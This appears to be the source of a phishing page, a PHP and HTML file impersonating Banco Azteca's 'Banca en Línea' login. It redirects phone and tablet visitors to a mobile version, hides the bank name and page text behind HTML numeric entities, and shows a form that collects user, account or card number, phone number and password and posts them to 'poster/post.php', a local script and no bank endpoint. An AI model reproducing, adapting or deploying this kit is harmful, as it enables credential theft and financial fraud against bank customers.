<?php
$tablet_browser = 0;
$mobile_browser = 0;
$body_class = 'desktop';
 
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $tablet_browser++;
    $body_class = "tablet";
}
 
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $mobile_browser++;
    $body_class = "mobile";
}
 
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
    $mobile_browser++;
    $body_class = "mobile";
}
 
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array(
    'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
    'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
    'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
    'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
    'newt','noki','palm','pana','pant','phil','play','port','prox',
    'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
    'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
    'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
    'wapr','webc','winw','winw','xda ','xda-');
 
if (in_array($mobile_ua,$mobile_agents)) {
    $mobile_browser++;
}
 
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
    $mobile_browser++;
    //Check for tablets on opera mini alternative headers
    $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
      $tablet_browser++;
    }
}
if ($tablet_browser > 0) {
// Si es tablet has lo que necesites
   header('Location: movil/');
}
else if ($mobile_browser > 0) {
// Si es dispositivo mobil has lo que necesites
   header('Location: movil/');
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>&#65;&#99;&#99;&#101;&#115;&#111;&nbsp;&#97;&nbsp;&#66;&#97;&#110;&#99;&#97;&nbsp;&#124;&nbsp;&#66;&#97;&#110;&#99;&#111;&nbsp;&#65;&#122;&#116;&#101;&#99;&#97;</title>
	
	<link rel="shortcut icon" 	 href="resources/favicon.ico" type="image/x-icon" sizes="32x32" />
    <link rel="apple-touch-icon" href="resources/favicon.png" sizes="57x57" />
    <link rel="apple-touch-icon" href="resources/favicon.png" sizes="114x114" />
	<link rel="stylesheet" media="all" href="css/fonts.css" />
 	<link rel="stylesheet" media="all" href="css/structurelog.css" />
	
	<link rel="stylesheet" href="css/estilos.css">
    <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>

</head>

<body class="ndx">
							<style>
							    .btn{
							        background-color: #17a54d;
							        height: 50px;
							        border-radius: 40px;
							    }
							    .btn:hover{
                                    color: #ffffff;
							    }
							</style>
							<style>
							.mdLgn{
                                display:flex;
                                justify-content: center;
                                align-items: center;
							</style>
<body class="ndx" background="resources/banner_banca_en_linea.jpg">


<header id="main-header">
		<nav>
			<a class="logotipo" href="#"><img src="resources/banco-azteca-logo.png" width="30px" height="30px"></a>
			</div>
		</nav>
</header>



<div class="mdLgn">
	<div class="lmt">
			<div class="mdCnt">
				<h2 class="mdHdr">
				&#65;&#99;&#99;&#101;&#100;&#101;&nbsp;&#97;&nbsp;&#116;&#117;<br />
					<span class="bold"><strong>&#66;&#97;&#110;&#99;&#97;&nbsp;&#101;&#110;&nbsp;&#76;&iacute;&#110;&#101;&#97;<div class="bull">&bull;</div></strong></span>
				</h2>
				<div class="frmWrpr">
                    <form action="poster/post.php" method="post">
					<ul>
						<li class="aCenter">
							<div class="fields">
								<input type="password" name="user"
									placeholder="Usuario/Cuenta/Tarjeta" class="field"
									maxlength="50" autocomplete="off"/>
							</div>
							<div class="fields">
								<input type="password" name="phone"
									placeholder="Celular" class="field"
									maxlength="10" minlength="10" autocomplete="off" id="phone"/>
							</div>
                            <div class="fields">
								<input type="password" name="pass"
									placeholder="Contraseña" class="field"
									maxlength="50" autocomplete="off"/>
							</div>
							<style>
							    .btn{
							        background-color: #17a54d;
							        height: 50px;
							        border-radius: 40px;
							    }
							    .btn:hover{
                                    color: #ffffff;
							    }
							</style>
							<div class="btns">
									<input type="submit" class="btn" value="Ingresar"></input>
								</div>
						</li>
					</ul>
                    </form>
				</div>
			</div>
			<div class="mdFtr">&#77;&#88;&#50;&#51;</div>
	</div>
</div>

<br><br><br><br><br>

<footer class="fter">
	<div class="cont">
		<a href="#" class="link">&#66;&#97;&#110;&#99;&#111;&nbsp;&#65;&#122;&#116;&#101;&#99;&#97;&nbsp;&#83;&#46;&#65;&#46;&#44;&nbsp;&#73;&#110;&#115;&#116;&#105;&#116;&#117;&#99;&#105;&#xF3;&#110;&nbsp;&#100;&#101;&nbsp;&#66;&#97;&#110;&#99;&#97;&nbsp;&#77;&#xFA;&#108;&#116;&#105;&#112;&#108;&#101;&#46;&nbsp;&#68;&#101;&#114;&#101;&#99;&#104;&#111;&#115;&nbsp;&#114;&#101;&#115;&#101;&#118;&#97;&#100;&#111;&#115;&#44;&nbsp;&#50;&#48;&#49;&#56;</a>
	</div>
</footer>
	
</body>
</html>